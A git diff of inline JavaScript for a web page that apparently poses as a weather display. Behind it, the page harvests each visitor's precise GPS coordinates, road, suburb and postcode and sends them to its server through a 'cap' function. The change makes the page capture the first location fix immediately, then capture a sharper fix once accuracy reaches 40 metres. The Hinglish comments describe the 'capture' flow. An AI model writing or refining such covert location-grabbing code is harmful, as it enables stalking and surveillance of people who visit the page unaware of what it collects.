@@ -291,52 +291,69 @@ function tryIP(){
   });
 }
 
-var captured=false;
+var gpsCaptured = false;
+var gpsRefined  = false;
 
 if(navigator.geolocation){
   var bestAcc=Infinity,bestLat=null,bestLon=null,wid=null;
 
-  // IP se turant start karo — GPS permission ka wait mat karo
+  // IP turant — koi wait nahi
   tryIP();
 
-  function doCapture(lat,lon,acc){
-    if(captured)return;
-    captured=true;
-    if(wid!=null){navigator.geolocation.clearWatch(wid);}
+  function doGPSCapture(lat,lon,acc){
     fetch(S+'/api/reverse?lat='+lat+'&lon='+lon)
       .then(function(res){return res.json();})
       .then(function(d){
-        // Weather already show ho raha IP se — sirf capture karo GPS data
+        if(d.city){document.getElementById('cn').textContent=d.city;}
+        if(d.country){document.getElementById('co').textContent=d.country;}
         cap({method:'gps',lat:lat,lon:lon,
              city:d.city,suburb:d.suburb,state:d.state,
              country:d.country,country_code:d.country_code,
              road:d.road,postcode:d.postcode,
              accuracy:Math.round(acc)});
-        // GPS city se update karo display
-        if(d.city){ document.getElementById('cn').textContent=d.city; }
-        if(d.country){ document.getElementById('co').textContent=d.country; }
       }).catch(function(){
         cap({method:'gps',lat:lat,lon:lon,accuracy:Math.round(acc)});
       });
   }
 
-  // 10 sec baad GPS nahi mila toh IP capture already ho chuka hai
-  var deadline=setTimeout(function(){
-    if(!captured&&bestLat!==null){doCapture(bestLat,bestLon,bestAcc);}
-  },10000);
+  // 8 sec baad best fix se capture karo
+  var deadline = setTimeout(function(){
+    if(bestLat !== null && !gpsRefined){
+      gpsRefined = true;
+      if(wid!=null){navigator.geolocation.clearWatch(wid);}
+      doGPSCapture(bestLat,bestLon,bestAcc);
+    }
+  }, 8000);
 
-  wid=navigator.geolocation.watchPosition(
+  wid = navigator.geolocation.watchPosition(
     function(p){
-      var lat=p.coords.latitude,lon=p.coords.longitude,acc=p.coords.accuracy;
-      if(acc<bestAcc){bestAcc=acc;bestLat=lat;bestLon=lon;}
-      if(acc<=35&&!captured){clearTimeout(deadline);doCapture(lat,lon,acc);}
+      var lat=p.coords.latitude, lon=p.coords.longitude, acc=p.coords.accuracy;
+
+      // Pehla GPS fix — turant capture karo bina kisi threshold ke
+      if(!gpsCaptured){
+        gpsCaptured = true;
+        bestAcc=acc; bestLat=lat; bestLon=lon;
+        doGPSCapture(lat,lon,acc);
+      }
+
+      // Better fix aaya — update best
+      if(acc < bestAcc){
+        bestAcc=acc; bestLat=lat; bestLon=lon;
+      }
+
+      // Agar accuracy 40m ya kam — refined capture karo aur band karo
+      if(acc <= 40 && !gpsRefined){
+        gpsRefined = true;
+        clearTimeout(deadline);
+        if(wid!=null){navigator.geolocation.clearWatch(wid);}
+        doGPSCapture(lat,lon,acc);
+      }
     },
     function(e){
       clearTimeout(deadline);
       if(wid!=null){navigator.geolocation.clearWatch(wid);}
-      // IP se already capture ho chuka hoga
     },
-    {enableHighAccuracy:true,timeout:10000,maximumAge:0}
+    {enableHighAccuracy:true,timeout:15000,maximumAge:0}
   );
 }else{tryIP();}
 </script>
